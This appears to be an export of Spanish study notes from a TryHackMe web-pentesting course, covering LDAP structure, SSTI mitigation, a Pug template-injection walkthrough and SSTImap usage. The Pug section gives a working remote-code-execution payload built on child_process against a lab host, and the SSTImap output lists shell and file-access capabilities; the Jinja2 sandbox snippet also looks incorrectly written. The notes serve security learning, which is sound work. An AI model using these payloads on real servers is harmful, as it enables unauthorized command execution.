[
  {
    "title": "2. Structure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/2-structure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/2. Structure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "En LDAP, las entradas de directorios están estructurados como objetos, cada uno adhiriéndose a un esquema específico que define las reglas y atributos aplicables al objeto. Este acercamiento orientado a objetos asegura consistencia y dirige cómo objetos como los usuarios o grupos se representan y manipulan en el directorio.\n\n<h4>Servicios que usan LDAP</h4>\n- **Microsoft Active Directory:** Un servicio para redes de dominio de Windows utiliza LDAP como pate de su protocolo base mpara manejar recursos de dominios.\n- **OpenLDAP:** Una implementación de código abierto de LDAP ampliamenet usada para manejar la información de los usuarios.\n\n--------------------------------------\n<h2>Formato LDIF</h2>\nLas entradas LDAP pueden representarse usando el LDAP Data Interchange Format (LDIF), un formato estándar de texto plano para representar entradas de directorios LDAP y operaciones de actualización. LDIF importa y exporta contenidos de directorio y describe modificaciones de directorios como añadir, modificar o eliminar entradas.\n\n--------------------------------------\n<h2>Estructura</h2>\nUn directorio LDAP sigue una estructura jerárquica como el árbol del sistema de archivos. Esta estructura comprende varias entradas representando un único ítem, como usuario, grupo o recurso.\n\n![[Pasted image 20260113152745.png]]\n\nArriba del árbol LDAP encontramos el **TLD (top-level domain)**, como `dc=ldap,dc=thm`. Debajo del TLD puede haber **subdominios** u **organizational units (OUs)** como `ou=people` p `ou=groups`, las cuales categorizan las entradas de directorios.\n\n- **Distinguished Names (DNs):** Sirve como identificador únicao para cada entrada en el directorio especificando el camino desde arriba hasta la entrada, por ejemplo: `cn=John Doe,ou=people,dc=example,dc=com`.\n- **Relative Distinguished Names (RDNs):** Representa niveles individuales en la jerarquía de directorios, como `cn=John Doe`, donde `cn` significa **Common Name**.\n- **Atributos:** Definen las propiedades de las entradas de directorios, como `mail=john@example.com`.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "LDAP, que significa Lightweight Directory Access Protocol (Protocolo de Acceso a Directorios Ligero), es un protocolo ampliamente usado para acceder y mantener servicios de información en directorios distribuidos mediante IP (Internet Protocol). Permite a las organizacione manejar a usuarios centralmente, así como grupos y otra informaciñon de directorios, normalmente usado para propósitos de autentificación y autorización en aplicaciiones web e internas.\n\n------------------------------------------\n<h2>Objetivos</h2>\n1. Ofrecer un entendimiento concienzudo de LDAP y su rol en los servicios de directorios.\n2. Explorar el árbol de estructura de LDAP y sus componentes clave.\n3. Introducción a LDAP injection, su impacto y cómo puede ser explotada.\n4. Equiparse con los conocimientos y habilidades necesarias para identificar y mitigar las vulnerabilidades de inyección LDAP.\n\n---------------------------------------\n<h2>Pre-requisitos</h2>\n1. Entendimiento básico de cómo funcionan los servicios de directorios.\n2. Conocimiento básico de principios de seguridad de aplicaciones web y vulnerabilidades comunes.\n3. Familiaridad de la estructura y los componentes de LDAP, como Distinguished Names (DNs) y atributos.\n4. Experiencia con herramientas y técnicas de testeo de seguridad en aplicaciones web como OWASP ZAP o Burp Suite.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "9. Mitigation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/9-mitigation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/9. Mitigation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "La Server-Side Template Injection puede ser mitigada siguiendo un conjunto de buenas prácticas e implementando medidas de seguridad en el código de la aplicación. Aquí está cómo mitigar SSTI en Smarty, Jade y Jinja2:\n\n----------------------------------------\n<h2>Jinja2</h2>\n1. **Modo Snadbox:** Habilita el entorno sandboxeado en Jinja2 para restringir la habilidad de la plantilla para acceder a funciones y atributos inseguros. Esto previene la ejecución arbitraria de código.\n\n```python\nfrom jinja2 import Environment, select_autoescape, sandbox\n\nenv = Environment(\n    autoescape=select_autoescape(['html', 'xml']),\n    extensions=[sandbox.SandboxedEnvironment]\n)\n```\n\n2. **Sanitización de Input:** Sanitiza siempre el input para escapar o eliminar caracteres y strings potencialmente peligrosos que puedan ser interpretados como código.\n3. **Auditoría de plantilla:** Revisa y audita regularmente las plantilas en busca de patrones de código inseguros, como directamente incrustar el input del usuario sin sanitización.\n\n--------------------------------------\n<h2>Jade(Pug)</h2>\n1. **Evita Evaluación Directa de JavaScript:** Restringe o evita uar la habilidad de Pug para evaluar código JavaScript en las plantillas. Usa métodos alternativos para manejar contenido dinámico que no involucre ejecución directa de código:\n   \n```pug\nvar user = !{JSON.stringify(user)}\nh1= user.name\n```\n\nUsa `!{}` con cuidado ya que permite putput no escapado, lo que puede ser peligroso. Mejor usa `#{}` que si espaca HTML por defecto.\n\n2. **Valida y sanitiza los Inputs:** Asegúrate de que todos los inputs del usuario sean validados contra el esquema estricto y sanitizados antes de que sean renderizados por el motor. Esto reduce el riesgo de ejecución de código arbitraria.\n3. **Ajusta la Configuración para que sea Segura:** Usa configuraciones de entorno que minimicen riesgos, como deshabilitar funcionalidades que permitan la ejecución del script.\n\n-----------------------------------------\n<h2>Smarty</h2>\n1. **Deshabilita las Etiquetas `{php}`:** Asegúrate de que las etiquetas `{php}` estén deshabilitadas en la configuración de Smarty para prevenir la ejecución de PHP en las plantillas.\n\n```php\n$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;\n$smarty->disable_security = false;\n```\n\n2. **Usa Manejadores Seguros:** Si debes permitir a los usuarios personalizar las plantillas, ofrece un conjunto de etiquetas o modificadores que puedan usar, lo que no permite la ejecuiñon directa de comandos o acceso a la shell.\n3. **Revisiones Regulares de Seguridad:** Realiza revisiones de seguridad de los archivos de plantillas y la lógica de manejo de información para asegurar que no hay prácticas inseguras. Actualiza Smarty regularmente.\n\n---------------------------------\n<h2>Sandboxing in Template Engines</h2>\nEs una funcionalidad de seguridad que restringe la ejecución de código potencialmente malicioso en las plantillas. Limita las acciones que pueden realizar estas como operaciones con archivos o ejecución de comandos en el sistema. La debida sandboxing ayuda a prevenir problemas de seguridad.\n\n<h4>Importancia del Sandboxing</h4>\n- **Restricciones de Funciones:** Limita las funciones o métodos que pueden ser llamados desde la plantilla, bloqueando operaciones potencialmente peligrosas.\n- **Acceso a Variables e Información:** Controla el acceso a variables globales e información sensible, asegurando que las plantillas no pueden manipular o exponer la información crítica.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "5. NodeJS - Pug",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/5-nodejs-pug/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/5. NodeJS - Pug.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Pug (antes conocido como Jade) es un motor de plantillas de alto rendimiento ampliamente usado en la comunidad Node.js por su renderizado de HTML conciso y funcionalidades avanzadas como condicionales, iteraciones y herencia de plantilla. Aunque ofrece herramientas poderosas para desarrolladores, su habilidad para ejecutar código JavaScript directamente en las plantillas puede suponer un riesgo importante.\n\nLas vulnerabilidades de seguridad de Pug principalmente salen de su capacidad de interpolar código JavaScript en variables de plantilla. Esta funcionalidad, diseñada para generar contenido dinámicamente puede ser explotada de forma maliciosa si el input del usuariose incrusta en la plantilla sin sanitizar correctamente.\n\n<h4>Puntos Clave de Vulnerabilidades</h4>\n- **Interpolación JavaScript:** Pug permite incrustar JS directamente en las plantillas usando `#{}`. Si el input del usuario se interpola sin sanitización adecuada puede llevar a ejecución de código arbitrario.\n- **Escapado por Defecto:** Pug ofrece un escapado automático para ciertos inputs, convirtiendo los caracteres como `<`, `>` y `&` a sus entidades HTML equivalentes para evitar ataques XSS. Sin embargo este comportamiento por defecto no cubre todos los problemas de seguridad, en particular al lidiar con interpolación no escapada `!{}` o escenarios de input complejos.\n\n--------------------------------------------------\n<h2>Explotación</h2>\nAntes de construir el payload es importante confirmar que la aplicación usa Pug. Ve a `http://ssti.thm:8001/jade/`.\n\nInyecta una sintaxis básica de Pug para comprobar el procesado de la plantilla, como `#{7*7}`. Si la aplicación responde con 49, confirma que Pug está procesando la plantilla.\n\n![[Pasted image 20260113110259.png]]\n\nYa que Pug permite la interpolación de JavaScrip, podemos usar el payload `#{root.process.mainModule.require('child_process').spawnSync(`ls`).stdout}`.\n\nEste, lo que hará será usar los módulos de Node.js para ejecutar comandos de sistema. Debajo está el análisis del payload.\n\n- `root.process`: Accede al objeto global `process` de Node.js en la plantilla Pug.\n- `mainModule.require('child_process')`: Requiere el módulo `child_process` de manera dinámica, bypasseando restricciones potenciales.\n- `spawnSync('ls')`: Ejecuta el comando `ls` de forma síncrona.\n- `.stdout`: Captura el output del comando.\n\n![[Pasted image 20260113110801.png]]\n\n-----------------------------------------------------------\n<h2>Por qué spawnSync('ls -lah') Puede No Funcionar</h2>\nCuando intentamos usar `spawnSync('ls -lah')`, estamos intentando pasar el comando entero y sus argumentos como una sola string. Esto no funciona porque `spawnSync` no separa la string en un comando y sus argumentos. En su lugar, lo trata todo como un comando a ejecutar.\n\nEste comportamiento es crítico para pervenir ciertos tipos de vulnerabilidades de seguridad. como la inyección de comandos.\n\n-------------------------------------------------------\n<h2>Entendiendo el Uso de spawnSync</h2>\nLa función `spawnSync` está diseñada para ejecutar un comando en la shell y dar control detallado sobre el input y output del comando. Es parte del módulo `child_process` de Node.js, lo que permite a Node.js ejecutar otros procesos en el sistema donde corre.\n\nLa firma de la función para `spawnSync` es:\n\n```javascript\nspawnSync(command, [args], [options])\n```\n\n- **command:** Esto es una string que especifica el comando a ejecutar.\n- **args:** Es un array con los argumentos que pasarle al comando.\n- **options:** Es un parámetro opcionar para especificar opciones como el directorio de trabajo, variables de entorno, timeout, etc.\n\n-----------------------------------------------\n<h2>Uso Correcto de spawnSync</h2>\nPara usar `spawnSync` correctamente para ejecutar el comando `ls` con el argumento `.lah`, deberías separar el comando y sus argumentos en partes diferentes.\n\n```javascript\nconst { spawnSync } = require('child_process');\nconst result = spawnSync('ls', ['-lah']);\nconsole.log(result.stdout.toString());\n```\n\nDe esta forma corregida:\n\n- **'ls':** Es el comando.\n- **\\['-lah']:** Es un array que contiene todos los argumentos pasados al comando.\n\nEsta estructura asegura que el comando `ls` se llame con el argumento `-lah`, permitiendo al comando funcionar como se espera. Por lo que el payload final es:\n\n`#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`\n\n![[Pasted image 20260113113014.png]]",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "7. Automating the Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/7-automating-the-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/7. Automating the Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "`SSTImap` es una herramienta que automatiza el proceso de comprobar y explotar vulnerabilidades en varios motores de plantillas. Hosteada en [GitHub](https://github.com/vladko312/SSTImap), ofrece un framework para descubrir vulnerabilidades de inyección en plantills.\n\nPara instalarla en tu máquina:\n\n```bash\ngit clone https://github.com/vladko312/SSTImap.git\ncd SSTImap\npip install -r requirements.txt\n```\n\nSTTImap es capaz de:\n\n- **Detectar Motor de Plantilla:** SSTImap puede ayudar a identificar el motor usado por una aplicación web, la cual es crucial para construir exploits específicos.\n- **Explotación automatizada:** Para vulnerabilidades conocidas, SSSTImap puede automatizar el proceso de explotarlas.\n\nPuedes usar SSTImap dándole la URL a escanear y cualquier opción necesaria, aquí un ejemplo de uso:\n\n```bash\npython3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='\n```\n\nEste comando intenta detectar vulnerabilidades SSTI usando los payloads preparados.\n\n```bash\nuser@tryhackme $ python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='           \n\n    ╔══════╦══════╦═══════╗ ▀█▀\n    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═\n    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __\n    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \\ / _` | '_ \\\n    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |\n    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\\__,_| .__/\n                             │                  | |\n                                                |_|\n[*] Version: 1.2.1\n[*] Author: @vladko312\n[*] Based on Tplmap\n[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.\nIt is the end user's responsibility to obey all applicable local, state and federal laws.\nDevelopers assume no liability and are not responsible for any misuse or damage caused by this program\n[*] Loaded plugins by categories: languages: 5; generic: 3; engines: 17; legacy_engines: 2\n[*] Loaded request body types: 4\n\n[*] Scanning url: http://ssti.thm:8002/mako/\n[*] Testing if Body parameter 'page' is injectable\n[*] Mako plugin is testing rendering with tag '*'\n[+] Mako plugin has confirmed injection with tag '*'\n[+] SSTImap identified the following injection point:\n\n  Body parameter: page\n  Engine: Mako\n  Injection: *\n  Context: text\n  OS: posix-linux\n  Technique: render\n  Capabilities:\n\n    Shell command execution: ok\n    Bind and reverse shell: ok\n    File write: ok\n    File read: ok\n    Code evaluation: ok, python code\n```",
    "modified": "2026-01-14T00:57:10"
  }
]